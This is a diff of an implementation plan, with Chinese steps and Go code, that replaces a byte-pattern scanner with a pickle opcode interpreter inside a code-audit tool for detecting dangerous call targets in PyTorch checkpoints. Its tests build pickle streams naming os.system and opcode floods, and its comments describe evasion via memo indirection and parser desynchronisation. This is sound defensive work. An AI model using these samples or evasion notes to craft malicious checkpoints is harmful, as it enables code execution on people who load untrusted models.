+			if strings.Join(got, ",") != strings.Join(tc.targets, ",") {
+				t.Errorf("%s (chunk=%d): targets = %v, want %v", tc.name, chunk, got, tc.targets)
+			}
+		}
+	}
+}
+
+// TestPickleInterpreterReadsTheQuickMnistCheckpointInOneWrite is the load-bearing
+// regression test for the zero-length operand, and it uses a real file rather than
+// a fixture. Its data.pkl is 1548 bytes and holds a zero-length BINUNICODE at
+// offset 1315; at evidenceReadChunk (64 KiB) the whole stream arrives in one Write,
+// which is exactly the case the defect mis-handled - the bytes after the operand
+// were left in the buffer and Flush reported a complete pickle as structural.
+// Before the fix this test fails; the same checkpoint read in chunks that split
+// after the operand passes even while broken, which is why a fixture that fits one
+// chunk is the one to use.
+//
+// It deliberately does not reuse net_001.pth, the checkpoint the test above reads.
+// net_001's data.pkl is 68362 bytes, so under a 64 KiB chunk it needs two Writes
+// and the stranded tail is picked up by the second one - it self-heals, and it
+// would report green against the broken interpreter. The three data.pkl files in
+// this corpus that fit a single 64 KiB read (1548, 1548 and 16009 bytes) are the
+// ones that expose the defect, and quick_mnist/train_baseline.pth is one of them.
+func TestPickleInterpreterReadsTheQuickMnistCheckpointInOneWrite(t *testing.T) {
+	const ckpt = "../../models/examples/TEE-test/TEE-test/output/quick_mnist/train_baseline.pth"
+	if _, err := os.Stat(ckpt); err != nil {
+		t.Skipf("corpus checkpoint not present: %v", err)
+	}
+	pkl := readZipMember(t, ckpt, "/data.pkl")
+	if pkl == nil {
+		t.Fatal("no data.pkl member in the checkpoint")
+	}
+	// One Write, then Flush: the whole file in a single chunk, as the streaming
+	// reader does for a file this size.
+	set := runPickleStream(t, pkl, len(pkl))
+	if set.Bound.Structural {
+		t.Fatalf("the checkpoint was marked structural read whole: %s", set.Bound.Reason)
+	}
+	got := pickleTargetsOf(set)
+	want := []string{
+		"collections.OrderedDict",
+		"torch._utils._rebuild_tensor_v2",
+		"torch.FloatStorage",
+		"torch.LongStorage",
+	}
+	if strings.Join(got, ",") != strings.Join(want, ",") {
+		t.Fatalf("targets = %v, want %v", got, want)
+	}
+}
+
+// readZipMember returns the bytes of the last zip member whose name has the given
+// suffix, or nil when there is none. It exists because a second corpus test was
+// added after the first one had already written this loop inline.
+func readZipMember(t *testing.T, path, suffix string) []byte {
+	t.Helper()
+	zr, err := zip.OpenReader(path)
+	if err != nil {
+		t.Fatalf("open %s: %v", path, err)
+	}
+	defer zr.Close()
+	var out []byte
+	for _, f := range zr.File {
+		if !strings.HasSuffix(f.Name, suffix) {
+			continue
+		}
+		rc, err := f.Open()
+		if err != nil {
+			t.Fatal(err)
+		}
+		out, err = io.ReadAll(rc)
+		rc.Close()
+		if err != nil {
+			t.Fatal(err)
+		}
+	}
+	return out
+}
+
+// TestPickleInterpreterKeepsOperandsUpToTheCapAndDropsPastIt pins the
+// pickleMaxOperandBytes boundary in both directions. At the cap the operand is
+// kept, so a target formed from it resolves; one byte past it the bytes are still
+// consumed - the parse stays in step - but the value is unresolved, so using it as
+// a STACK_GLOBAL operand is a structural bound rather than a silent wrong answer.
+func TestPickleInterpreterKeepsOperandsUpToTheCapAndDropsPastIt(t *testing.T) {
+	atCap := strings.Repeat("m", pickleMaxOperandBytes)
+	kept := []byte{0x80, 0x04}
+	kept = append(kept, pickleBinUnicode(atCap)...)
+	kept = append(kept, 0x8c, 0x01, 'x')
+	kept = append(kept, 0x93, 0x2e)
+	set := runPickleStream(t, kept, 64*1024)
+	if set.Bound.Structural {
+		t.Fatalf("an operand exactly at the cap set a structural bound: %s", set.Bound.Reason)
+	}
+	if got := pickleTargetsOf(set); len(got) != 1 || got[0] != atCap+".x" {
+		t.Fatalf("targets = %d entries, want one of the cap-length module; the operand at the cap was dropped", len(got))
+	}
+
+	past := []byte{0x80, 0x04}
+	past = append(past, pickleBinUnicode(strings.Repeat("m", pickleMaxOperandBytes+1))...)
+	past = append(past, 0x8c, 0x01, 'x')
+	past = append(past, 0x93, 0x2e)
+	if set := runPickleStream(t, past, 64*1024); !set.Bound.Structural {
+		t.Error("an operand past the cap, used as a STACK_GLOBAL operand, did not set Bound.Structural")
+	}
+}
+
+// TestPickleInterpreterReadsTwoByteOperands pins the 2-byte operand width, which
+// only BININT2 and EXT2 use. Reading one byte of it - or three - desynchronises the
+// parse at that opcode and is invisible unless the stream continues past it, so the
+// fixture puts a GLOBAL after the operand and asserts it is still found.
+func TestPickleInterpreterReadsTwoByteOperands(t *testing.T) {
+	for _, op := range []byte{0x4d, 0x83} { // BININT2, EXT2
+		data := []byte{0x80, 0x04, op, 0x01, 0x02}
+		data = append(data, pickleGlobal("os", "system")...)
+		data = append(data, 0x2e)
+		set := runPickleStream(t, data, 64*1024)
+		if set.Bound.Structural {
+			t.Errorf("opcode 0x%02x: structural bound: %s", op, set.Bound.Reason)
+		}
+		if got := pickleTargetsOf(set); len(got) != 1 || got[0] != "os.system" {
+			t.Errorf("opcode 0x%02x: targets = %v, want [os.system]: the 2-byte operand desynchronised the parse", op, got)
+		}
+	}
+}
+
+// TestPickleInterpreterBoundsARunawayStack pins that the value-stack cap is
+// enforced and reported. A flood of operand-free opcodes is the cheapest way to
+// grow the stack - each NONE is one byte and one slot - so it is what an attacker
+// would send, and a cap that stopped the parse without recording a bound would
+// miss every target after the cap while looking like a complete scan.
+func TestPickleInterpreterBoundsARunawayStack(t *testing.T) {
+	data := bytes.Repeat([]byte{0x4e}, pickleMaxStackSlots*2) // NONE
+	set := runPickleStream(t, data, 64*1024)
+	if !set.Bound.Structural {
+		t.Fatal("a runaway value stack did not set Bound.Structural; the cap is silent")
+	}
+	if !strings.Contains(set.Bound.Reason, "value stack") {
+		t.Errorf("reason = %q, want it to name the value stack", set.Bound.Reason)
+	}
+}
+
+// TestPickleInterpreterBoundsARunawayMemo pins the memo cap the same way. MEMOIZE
+// is one byte and adds one entry, so it is the memo-side analogue of the NONE
+// flood.
+func TestPickleInterpreterBoundsARunawayMemo(t *testing.T) {
+	data := bytes.Repeat([]byte{0x94}, pickleMaxMemoSlots*2) // MEMOIZE
+	set := runPickleStream(t, data, 64*1024)
+	if !set.Bound.Structural {
+		t.Fatal("a runaway memo did not set Bound.Structural; the cap is silent")
+	}
+	if !strings.Contains(set.Bound.Reason, "memo") {
+		t.Errorf("reason = %q, want it to name the memo", set.Bound.Reason)
 	}
 }
 ```
@@ -1260,193 +1923,728 @@ func TestPickleTargetsCarryAcrossChunks(t *testing.T) {
 - [ ] **Step 2: 跑测试确认失败**
 
 ```bash
-go test ./internal/codeaudit/ -run TestPickleTargets 2>&1 | head -10
+go test ./internal/codeaudit/ -run TestPickleInterpreter 2>&1 | head -10
 ```
 
-预期：编译失败，`undefined: pickleTargets`。
+预期：编译失败，`undefined: runPickleStream`（以及实现侧的 `newPickleScanner` 等新符号）。
 
 - [ ] **Step 3: 实现**
 
-追加到 `binary_evidence.go`：
+追加到 `binary_evidence.go`（文件顶部 import 块补 `"bytes"` 与 `"encoding/binary"`）。
+
+**删除**：这一版把 Task 4 曾经的字节扫描实现整个换掉，所以 `pickleTargets`、`readLineString`、`readShortBinUnicode`、`pickleTarget` 类型、`pickleCarryBytes` 常量，以及旧的 `pickleScanner` 结构与它的 `emit` **都不再存在**——实现者要删掉它们，而不是留着。留着不只是死代码：一个已被真实文件证伪的"按字节找相邻模式"留在树里，会让后来者以为那条路是可选的。
+
+先补 opcode 表与状态机：
 
 ```go
-// Opcodes the pickle scan reads. Only the two that carry a call target matter:
-// everything else in a pickle stream is data, and the extractor's job is to name
-// what the stream asks the unpickler to resolve.
+// The pickle interpreter walks an opcode stream as opcodes, not as bytes.
+//
+// A byte-pattern scanner cannot do this job. A pickle stream interleaves its
+// opcodes with raw data payloads - string and byte operands hold arbitrary
+// bytes, including 0x63 and newlines - so any scan that hunts for "GLOBAL
+// followed by two newline-terminated runs" will eventually read a data byte as
+// an opcode, desynchronise, and then either invent a target out of the data or
+// skip over a real one. Measured on models/examples/Retina-DKD's net_001.pth,
+// whose data.pkl is a 68362-byte protocol-2 stream with four genuine GLOBAL
+// opcodes, that scanner reported 39 targets - two clean, one corrupted, and
+// torch.LongStorage missing because a false-positive match at offset 150
+// swallowed the 685 bytes containing it. The whole point of this channel is to
+// catch "c posix\nsystem\n"; a target that lands where torch.LongStorage landed
+// was being silently dropped.
+//
+// So the parser is an interpreter. It does not build objects and it does not
+// need to: it needs to consume every opcode's operand at the right width so it
+// never loses its place, and it needs to resolve two things - the two inline
+// operands of GLOBAL and INST, and the top two stack items at STACK_GLOBAL. The
+// memo table closes a documented evasion: a stream that MEMOIZEs a module name
+// and fetches it back with BINGET has no target adjacent to STACK_GLOBAL, so no
+// adjacency scan can see it, but the value is still on the stack when the opcode
+// runs.
+
+// pickOperand classifies how an opcode's operand is framed.
+type pickOperand uint8
+
 const (
-	opGlobal       = 'c'  // GLOBAL: module \n name \n
-	opStackGlobal  = 0x93 // STACK_GLOBAL: pops two strings from the stack
-	opShortBinUnic = 0x8c // SHORT_BINUNICODE: 1-byte length, then the bytes
-	opBinUnicode   = 'X'  // BINUNICODE: 4-byte little-endian length, then the bytes
+	pickNone pickOperand = iota
+	pickFixed1
+	pickFixed2
+	pickFixed4
+	pickFixed8
+	pickLine     // bytes through the next newline
+	pickTwoLines // two of those, as GLOBAL and INST encode their operands
+	pickCounted1 // 1-byte little-endian length, then that many payload bytes
+	pickCounted4 // 4-byte little-endian length, then the payload
+	pickCounted8 // 8-byte little-endian length, then the payload
 )
 
-// pickleTarget is a module and attribute pair a pickle stream asks the unpickler
-// to resolve.
-type pickleTarget struct {
-	Module string
-	Name   string
-	Offset int64
+// operandOf names the operand framing of one opcode, and reports whether the byte
+// is an opcode at all.
+//
+// The table is the complete protocol 0-5 set, and completeness is load-bearing.
+// Leaving an opcode out does not degrade a result - it desynchronises the parse at
+// that byte and turns the rest of the stream into noise. A missed opcode is
+// therefore worse than a missed target, and there is no opcode here that is safe
+// to skip: the cost of each is one case, and the cost of a gap is a checkpoint
+// that either loses its targets or blocks the import on a false structural bound.
+func operandOf(op byte) (pickOperand, bool) {
+	switch op {
+	case 0x2e, 0x30, 0x31, 0x32, 0x4e, 0x51, 0x52, 0x61, 0x62,
+		0x64, 0x65, 0x6c, 0x6f, 0x73, 0x74, 0x75, 0x7d, 0x5d, 0x29,
+		0x81, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8f, 0x90, 0x91, 0x92,
+		0x93, 0x94, 0x97, 0x98, 0x28:
+		// STOP POP POP_MARK DUP NONE BINPERSID REDUCE APPEND BUILD DICT
+		// APPENDS LIST OBJ SETITEM TUPLE SETITEMS EMPTY_DICT EMPTY_LIST
+		// EMPTY_TUPLE MARK NEWOBJ TUPLE1..3 NEWTRUE NEWFALSE EMPTY_SET
+		// ADDITEMS FROZENSET NEWOBJ_EX STACK_GLOBAL MEMOIZE NEXT_BUFFER
+		// READONLY_BUFFER: no operand, so the next byte is an opcode.
+		return pickNone, true
+	case 0x4a, 0x6a, 0x72, 0x84:
+		return pickFixed4, true // BININT LONG_BINGET LONG_BINPUT EXT4
+	case 0x47, 0x95:
+		// BINFLOAT, and FRAME: FRAME's 8-byte operand is a length hint for the
+		// bytes that follow it, not a body FRAME consumes, so it is read and
+		// discarded like any other fixed operand.
+		return pickFixed8, true
+	case 0x4b, 0x82, 0x71, 0x68, 0x80:
+		return pickFixed1, true // BININT1 EXT1 BINPUT BINGET PROTO
+	case 0x4d, 0x83:
+		return pickFixed2, true // BININT2 EXT2
+	case 0x46, 0x49, 0x4c, 0x50, 0x53, 0x56, 0x67, 0x70:
+		return pickLine, true // FLOAT INT LONG PERSID STRING UNICODE GET PUT
+	case 0x63, 0x69:
+		return pickTwoLines, true // GLOBAL, INST: module \n name \n
+	case 0x55, 0x43, 0x8a, 0x8c:
+		return pickCounted1, true // SHORT_BINSTRING SHORT_BINBYTES LONG1 SHORT_BINUNICODE
+	case 0x54, 0x58, 0x42, 0x8b:
+		return pickCounted4, true // BINSTRING BINUNICODE BINBYTES LONG4
+	case 0x8d, 0x8e, 0x96:
+		return pickCounted8, true // BINUNICODE8 BINBYTES8 BYTEARRAY8
+	}
+	return pickNone, false
 }
 
-// pickleTargets finds the call targets in one pickle buffer.
+// pickPhase is the interpreter's position within the opcode in progress. It is
+// state that crosses Write calls, which is what a chunk-boundary-safe parser
+// needs instead of the byte window the pattern scanner carried.
+type pickPhase uint8
+
+const (
+	pickPhaseOp pickPhase = iota
+	pickPhaseFixed
+	pickPhaseLine
+	pickPhasePayload
+)
+
+// pickleMaxOperandBytes bounds one operand the interpreter will hold. A module or
+// attribute name beyond this is not a name any rule or reader can act on, so the
+// bytes are consumed - the parse must stay in step - but not kept. The value
+// becomes unresolved, and if it is later used as a target's module or name that
+// is a structural bound rather than a silence: we did not read it, so we will not
+// claim to have looked.
+const pickleMaxOperandBytes = 64 * 1024
+
+// pickleMaxStackSlots bounds the value stack. A pickle legitimately holds many
+// slots at once: a mapping is written as MARK, then every key and value, then a
+// single SETITEMS, so a dict of n entries occupies about 2n slots before any of
+// them is popped. The deepest stack reached by any checkpoint in this repository
+// is 1007 slots, on a cifar-10 batch whose own array data is truncated at 11.3
+// MiB; the deepest complete one, a Retina-DKD net, reaches 826, and a full
+// mnist/cifar model reaches 271. 1<<20 is about a thousand times the deepest
+// measured and covers a mapping of some half a million entries, far past the tens
+// of thousands a real state dict holds. The bound is memory, not correctness: at
+// the 24-byte size of a pickSlot, 1<<20 slots is 24 MiB, where the unbounded stack
+// a flood of operand-free opcodes would otherwise reach is gigabytes (4 MiB of
+// NONE alone grows it to 4.2M slots, about 100 MiB).
 //
-// It recognises the two encodings of "resolve this attribute": the GLOBAL opcode,
-// which carries the module and name inline, and STACK_GLOBAL, which takes them
-// from two string pushes. It does not interpret the stack, and it does not need
-// to: in a well-formed stream the two pushes sit immediately before the opcode,
-// so the shape is a byte pattern rather than a data-flow question.
+// The generosity is deliberate and it is the opposite trade from the operand cap.
+// The operand cap can afford to be tight because an over-long name is not a name
+// any rule can match; the stack cap cannot, because a legitimate state dict puts
+// two slots per entry on the stack before its SETITEMS, so a cap sized for "how
+// deep does a value nest" would bound a few hundred thousand keys - an ordinary
+// checkpoint - and block the import.
+const pickleMaxStackSlots = 1 << 20
+
+// pickleMaxMemoSlots bounds the memo table. Every object a stream memoizes costs
+// one entry, and torch.save memoizes each tensor and its storage, so the count
+// tracks the model's size: the largest measured here is 3669, on the same
+// Retina-DKD net, and a small mnist model reaches 159. 1<<20 is about 280 times
+// that, enough headroom for a model two orders of magnitude larger. Like the stack
+// cap this is a memory bound - a stream that MEMOIZEs on every byte would
+// otherwise grow the map without limit - and the map, at roughly 64 bytes an
+// entry, is the larger of the two allocations.
+const pickleMaxMemoSlots = 1 << 20
+
+// pickSlot is one value-stack or memo entry.
 //
-// Nothing is filtered here. Every target the stream names becomes evidence, and
-// which of them is dangerous is decided in the rule table, so that the policy is
-// stated once, in the place a reader looks for it, instead of being split between
-// an allow list of "normal" modules here and a deny list there.
-func pickleTargets(data []byte) []pickleTarget {
-	var out []pickleTarget
-	for i := 0; i < len(data); i++ {
-		switch data[i] {
-		case opGlobal:
-			// GLOBAL carries both operands inline, each newline-terminated. Both
-			// must be present for the shape to be a target: a stray 'c' byte in
-			// machine code followed by no newline is not a call.
-			mod, nMod, ok := readLineString(data[i+1:])
-			if !ok {
-				continue
-			}
-			name, nName, ok := readLineString(data[i+1+nMod:])
-			if !ok {
-				continue
-			}
-			out = append(out, pickleTarget{Module: mod, Name: name, Offset: int64(i)})
-			i += nMod + nName - 1
-		case opShortBinUnic:
-			mod, n1, ok1 := readShortBinUnicode(data[i:])
-			if !ok1 || i+n1 >= len(data) || data[i+n1] != opShortBinUnic {
-				continue
-			}
-			name, n2, ok2 := readShortBinUnicode(data[i+n1:])
-			if !ok2 || i+n1+n2 >= len(data) || data[i+n1+n2] != opStackGlobal {
-				continue
-			}
-			out = append(out, pickleTarget{Module: mod, Name: name, Offset: int64(i)})
-			i += n1 + n2 - 1
-		}
-	}
-	return out
+// Only string-ness and the string itself are kept. The interpreter never has to
+// know what an object is; it has to know whether the top two slots at
+// STACK_GLOBAL are module and name strings, and which strings they are.
+// unresolved marks a value whose bytes were not kept - an operand past the cap, or
+// a memo index never written - so that a target formed from it is refused rather
+// than guessed.
+type pickSlot struct {
+	mark       bool
+	str        bool
+	unresolved bool
+	value      string
+}
+
+// pickleScanner finds the call targets in one pickle stream.
+type pickleScanner struct {
+	set *EvidenceSet
+
+	// off is the absolute file offset of buf[0], so an evidence offset is the
+	// opcode's offset in the file and not an offset in the current chunk.
+	off int64
+	// buf holds bytes received but not yet consumed. A counted operand larger
+	// than pickleMaxOperandBytes is consumed without being stored, so buf stays
+	// bounded by the cap plus one fixed operand.
+	buf []byte
+
+	phase     pickPhase
+	op        byte
+	opOff     int64
+	linesLeft int
+	arg       []byte
+	need      int64
+	sizing    bool
+	keep      bool
+
+	stack []pickSlot
+	memo  map[int]pickSlot
+
+	// stopped ends parsing; hitStop distinguishes the pickle's own STOP from an
+	// abort, so the trailing-bytes notice is not emitted after an abort.
+	stopped  bool
+	hitStop  bool
+	trailing int64
+}
+
+func newPickleScanner(set *EvidenceSet) *pickleScanner {
+	return &pickleScanner{set: set, memo: map[int]pickSlot{}}
 }
 ```
 
-继续追加：
+继续追加读循环与状态推进：
 
 ```go
-// readLineString reads one newline-terminated string, as GLOBAL encodes its two
-// operands. It returns the string, the number of bytes consumed including the
-// terminator, and whether the shape held.
+// Write implements io.Writer. All parse state - the phase, the operand in
+// progress, the absolute offset - crosses calls, so the result does not depend on
+// where the chunk boundaries fall; a boundary inside an operand and a boundary on
+// an opcode are the same thing to this loop. step consumes the buffer down to an
+// unfinished opcode and returns 0 only when there is nothing left to take, so no
+// byte is skipped and none is consumed twice.
 //
-// The caller advances by n rather than by the returned slice: both operands are
-// read from the same buffer at computed offsets, and returning a slice as well
-// would be a second way to say where the next operand starts, one of which would
-// eventually be wrong.
-func readLineString(data []byte) (value string, n int, ok bool) {
-	if len(data) == 0 {
-		return "", 0, false
-	}
-	end := bytes.IndexByte(data, '\n')
-	if end < 0 {
-		return "", 0, false
-	}
-	return string(data[:end]), end + 1, true
-}
-
-// readShortBinUnicode reads a SHORT_BINUNICODE operand: the opcode, a one-byte
-// length, then that many bytes.
-func readShortBinUnicode(data []byte) (value string, n int, ok bool) {
-	if len(data) < 2 || data[0] != opShortBinUnic {
-		return "", 0, false
-	}
-	l := int(data[1])
-	if len(data) < 2+l {
-		return "", 0, false
-	}
-	return string(data[2 : 2+l]), 2 + l, true
-}
-
-// pickleScanner finds pickle targets in a byte stream.
-//
-// It carries a window between reads because a target can straddle a chunk
-// boundary, and a scan that missed those would be input-dependent in exactly the
-// way the completeness scheme exists to avoid. The window is small and fixed:
-// the longest shape it must hold is two SHORT_BINUNICODE operands of at most 255
-// bytes each plus the opcodes.
-type pickleScanner struct {
-	set   *EvidenceSet
-	carry []byte
-	at    int64
-}
-
-// pickleCarryBytes is the window held between reads.
-const pickleCarryBytes = 1024
-
-func newPickleScanner(set *EvidenceSet) *pickleScanner {
-	if set.seen == nil {
-		set.seen = map[string]bool{}
-	}
-	return &pickleScanner{set: set}
-}
-
+// That invariant is what makes the two messages in Flush mean what they say. At a
+// break the retained bytes are empty or the start of an opcode the buffer could not
+// finish, so "ended mid-opcode" names a real truncation and "ended without STOP"
+// names a stream that ran out of bytes - neither is an artefact of where the reads
+// happened to split. An earlier version asserted this chunk-independence without
+// holding it: a counted operand of length zero completed at the payload phase
+// having consumed nothing, returned 0, and was read as "needs more input", so the
+// tail of the buffer was stranded and a complete pickle could reach Flush looking
+// unfinished. The loop in step is what restores the invariant, and
+// TestPickleInterpreterParsesCPythonsZeroLengthOperands pins it.
 func (p *pickleScanner) Write(chunk []byte) (int, error) {
-	buf := append(p.carry, chunk...)
-	for _, t := range pickleTargets(buf) {
-		p.emit(t.Module+"."+t.Name, p.at+t.Offset)
+	if p.stopped {
+		p.trailing += int64(len(chunk))
+		return len(chunk), nil
 	}
-	keep := pickleCarryBytes
-	if keep > len(buf) {
-		keep = len(buf)
+	p.buf = append(p.buf, chunk...)
+	i := 0
+	for i < len(p.buf) {
+		n := p.step(p.buf[i:], p.off+int64(i))
+		i += n
+		if p.stopped {
+			p.trailing += int64(len(p.buf) - i)
+			i = len(p.buf)
+			break
+		}
+		if n == 0 {
+			break
+		}
 	}
-	p.carry = append(p.carry[:0], buf[len(buf)-keep:]...)
-	p.at += int64(len(buf) - keep)
+	p.off += int64(i)
+	p.buf = append(p.buf[:0], p.buf[i:]...)
 	return len(chunk), nil
 }
 
-// Flush drops the carry. It exists so the scanner satisfies the same lifecycle
-// as the string scanner; unlike that one it has nothing pending to emit, because
-// a target needs its trailing opcode to be recognised at all.
-func (p *pickleScanner) Flush() {}
-
-// emit records one pickle target as evidence. Targets dedupe the same way
-// strings do: a checkpoint that rebuilds ten thousand tensors names the same
-// rebuilder ten thousand times, and the report needs it once.
-func (p *pickleScanner) emit(text string, at int64) {
-	if p.set.seen["pickle:"+text] {
+// Flush ends the stream. It is where the two completeness claims are made: a
+// stream that did not reach STOP was not read to the end of its structure, and a
+// stream that did has trailing bytes outside that structure - visible in a
+// notice, but not a bound, because the unpickler stops at STOP too.
+func (p *pickleScanner) Flush() {
+	if !p.stopped {
+		if p.off > 0 && p.phase != pickPhaseOp {
+			p.set.markStructural(fmt.Sprintf("pickle stream ended mid-opcode at offset %d", p.off))
+		} else if p.off > 0 {
+			p.set.markStructural(fmt.Sprintf("pickle stream ended at offset %d without STOP", p.off))
+		}
 		return
 	}
-	p.set.seen["pickle:"+text] = true
-	p.set.Lines = append(p.set.Lines, EvidenceLine{Source: SourcePickle, Offset: at, Text: text})
+	if p.hitStop && p.trailing > 0 {
+		p.set.add(SourceNotice, 0,
+			fmt.Sprintf("%d byte(s) after the pickle STOP were not interpreted", p.trailing))
+	}
+}
+
+// step takes as much of the opcode stream as b holds, and returns the number of
+// bytes it consumed. It returns 0 only when it cannot consume anything - b is
+// empty and the opcode in progress is incomplete - so the caller can tell
+// "finished, keep these bytes for the next Write" from "made no progress".
+//
+// The loop exists for the one opcode that completes without consuming a byte: a
+// counted operand whose declared length is zero is finished at the payload phase
+// having read nothing, and returning 0 there would be read as "needs more input"
+// even though the bytes it needs are already in b. A stream that hit that would
+// have its tail stranded, and Flush would report a valid pickle as ending without
+// STOP. So the zero-length completion falls through to the opcode phase with the
+// same b and absOff - no byte was consumed, so both are unchanged - and the next
+// opcode is taken in this same call.
+//
+// The loop is bounded without a counter because the only path that continues
+// consumes nothing and moves the phase forward: the next turn is in pickPhaseOp,
+// which either returns 0 on an empty b, returns 1 having taken an opcode, or
+// returns through one of the other cases. A second zero-length operand in the same
+// call is a second trip, capped by the bytes in b.
+//
+// It reports the absolute offset of each opcode it executes because that, not the
+// operand's offset, is what an evidence line carries.
+func (p *pickleScanner) step(b []byte, absOff int64) int {
+	for {
+		switch p.phase {
+		case pickPhaseOp:
+			if len(b) == 0 {
+				return 0
+			}
+			op := b[0]
+			desc, ok := operandOf(op)
+			if !ok {
+				// We cannot know this byte's operand width, so we cannot know where
+				// the next opcode begins. Guessing is what desynchronises; stopping
+				// without a bound would let a later opcode hide, so the parse ends
+				// here and the file is recorded as not fully read.
+				p.set.markStructural(fmt.Sprintf("unknown pickle opcode 0x%02x at offset %d", op, absOff))
+				p.stopped = true
+				return 1
+			}
+			p.op = op
+			p.opOff = absOff
+			p.arg = p.arg[:0]
+			p.keep = true
+			p.sizing = false
+			switch desc {
+			case pickNone:
+				p.exec(op)
+				return 1
+			case pickFixed1:
+				p.phase, p.need = pickPhaseFixed, 1
+			case pickFixed2:
+				p.phase, p.need = pickPhaseFixed, 2
+			case pickFixed4:
+				p.phase, p.need = pickPhaseFixed, 4
+			case pickFixed8:
+				p.phase, p.need = pickPhaseFixed, 8
+			case pickLine:
+				p.phase, p.need, p.linesLeft = pickPhaseLine, -1, 1
+			case pickTwoLines:
+				p.phase, p.need, p.linesLeft = pickPhaseLine, -1, 2
+			case pickCounted1:
+				p.phase, p.need, p.sizing = pickPhaseFixed, 1, true
+			case pickCounted4:
+				p.phase, p.need, p.sizing = pickPhaseFixed, 4, true
+			case pickCounted8:
+				p.phase, p.need, p.sizing = pickPhaseFixed, 8, true
+			}
+			return 1
+
+		case pickPhaseFixed:
+			n := len(b)
+			if int64(n) > p.need {
+				n = int(p.need)
+			}
+			p.arg = append(p.arg, b[:n]...)
+			p.need -= int64(n)
+			if p.need > 0 {
+				return n
+			}
+			if p.sizing {
+				length := leUint(p.arg)
+				p.arg = p.arg[:0]
+				p.need = length
+				p.phase = pickPhasePayload
+				if length > pickleMaxOperandBytes {
+					p.keep = false
+				}
+				return n
+			}
+			p.phase = pickPhaseOp
+			p.exec(p.op)
+			return n
+
+		case pickPhaseLine:
+			idx := bytes.IndexByte(b, '\n')
+			if idx < 0 {
+				p.appendArg(b)
+				return len(b)
+			}
+			p.appendArg(b[:idx+1])
+			p.linesLeft--
+			if p.linesLeft > 0 {
+				return idx + 1
+			}
+			p.phase = pickPhaseOp
+			p.exec(p.op)
+			return idx + 1
+
+		case pickPhasePayload:
+			n := len(b)
+			if int64(n) > p.need {
+				n = int(p.need)
+			}
+			if p.keep {
+				p.arg = append(p.arg, b[:n]...)
+			}
+			p.need -= int64(n)
+			if p.need > 0 {
+				return n
+			}
+			p.phase = pickPhaseOp
+			p.exec(p.op)
+			if n == 0 {
+				// A zero-length operand: the completion above consumed nothing, so
+				// returning here would claim it needs more bytes and strand the
+				// rest of b. Loop instead, with b and absOff unchanged, so the next
+				// opcode is taken in this call.
+				continue
+			}
+			return n
+		}
+	}
+}
+
+// appendArg keeps operand bytes up to the cap. Past the cap the value is dropped
+// but the bytes are still consumed by the caller, so the parse stays in step.
+func (p *pickleScanner) appendArg(b []byte) {
+	if !p.keep {
+		return
+	}
+	if len(p.arg)+len(b) > pickleMaxOperandBytes {
+		p.keep = false
+		p.arg = p.arg[:0]
+		return
+	}
+	p.arg = append(p.arg, b...)
+}
+
+// leUint reads a little-endian unsigned length of len(b) bytes. The 8-byte case is
+// clamped: an 8-byte length is attacker-controlled and can name a byte count past
+// any real file, and an unclamped value would overflow the skip counter.
+func leUint(b []byte) int64 {
+	switch len(b) {
+	case 1:
+		return int64(b[0])
+	case 2:
+		return int64(binary.LittleEndian.Uint16(b))
+	case 4:
+		return int64(binary.LittleEndian.Uint32(b))
+	case 8:
+		v := binary.LittleEndian.Uint64(b)
+		if v > 1<<62 {
+			return 1 << 62
+		}
+		return int64(v)
+	}
+	return 0
 }
 ```
 
-`emit` 用 `"pickle:"+text` 作去重键，与 strings 的裸文本键分开：同一个 `system` 既可能是字符串字面量也可能是 pickle 目标，两者来源不同、都要出现在证据列表里。
+> **`pickPhaseFixed` 与计数操作数的长度前缀路径是正确的，不要动它们。** 上面那个 `continue` 只属于 `pickPhasePayload` 里"声明长度为 0"的那一次完成，因为它是唯一一条**消费 0 字节就算完成一个操作数**的路径。`pickPhaseFixed` 永远不会以 0 收尾：固定宽度操作数的 `need` 是 1/2/4/8，计数操作数的长度前缀宽度是 1/4/8，都不小于 1，所以它在把 `need` 减到 0 时必然至少消费了一个字节，`return n` 里的 `n >= 1`。计数操作数转入 payload 的那一步也只改 `p.need`、`p.phase`，本身不动字节，它返回的仍是刚消费的长度前缀字节数。因此"当操作数声明长度为 0 时回到 opcode 相位继续"这件事，`pickPhaseFixed` 和长度前缀那一步都没有对应位置——**不要为了"统一"把 `continue` 或 `return 0` 的判定搬进去**，那样会把一个只对 0 长操作数成立的补丁，塞进本来不会有该场景的分支里，反而制造新的错位。判断标准只有一条：这次 `step` 是否**完成了一个操作数却消费了 0 字节**；只有 payload 阶段的 0 长完成满足它。
 
-- [ ] **Step 4: 把 pickle 扫描接进 `streamEvidence`**
+继续追加栈效应与目标产出：
 
-修改 `streamEvidence` 的读循环，使一次遍历同时产出三类证据：
+```go
+func (p *pickleScanner) push(s pickSlot) {
+	if len(p.stack) >= pickleMaxStackSlots {
+		p.overflow(fmt.Sprintf("pickle value stack exceeded %d slots at offset %d", pickleMaxStackSlots, p.opOff))
+		return
+	}
+	p.stack = append(p.stack, s)
+}
+
+// overflow records a bound the interpreter cannot continue past and ends the
+// parse. A stream that reaches either cap is not behaving like a pickle - the real
+// ones measured here stay three orders of magnitude below - so "the structure was
+// not read" is the honest report, and it takes the fail-closed direction: on a
+// pickle that is a structural bound, whichwithholds a clean-scan verdict rather
+// than hiding whatever came after the point the interpreter stopped.
+//
+// The stop is what keeps the bound bounded. Marking and continuing would leave the
+// stack (or memo) growing on every following opcode, so the cap would record a
+// finding without limiting the memory it exists to limit. Both callers therefore
+// return to exec's caller right after this, and Write - which checks p.stopped after
+// every step - stops feeding the buffer and counts the rest as trailing bytes.
+func (p *pickleScanner) overflow(reason string) {
+	p.set.markStructural(reason)
+	p.stopped = true
+}
+
+func (p *pickleScanner) pop(n int) {
+	if n > len(p.stack) {
+		n = len(p.stack)
+	}
+	p.stack = p.stack[:len(p.stack)-n]
+}
+
+// popToMark discards stack entries through the nearest mark. A missing mark is
+// tolerated: it can only mis-shape the value stack, never the byte stream, and
+// refusing here would block a file on a stack-model mistake - the one failure mode
+// that would make the channel useless.
+func (p *pickleScanner) popToMark() {
+	for i := len(p.stack) - 1; i >= 0; i-- {
+		if p.stack[i].mark {
+			p.stack = p.stack[:i]
+			return
+		}
+	}
+	p.stack = p.stack[:0]
+}
+
+func (p *pickleScanner) top() (pickSlot, bool) {
+	if len(p.stack) == 0 {
+		return pickSlot{}, false
+	}
+	return p.stack[len(p.stack)-1], true
+}
+
+// exec applies one opcode's stack effect and resolves its target, if it names one.
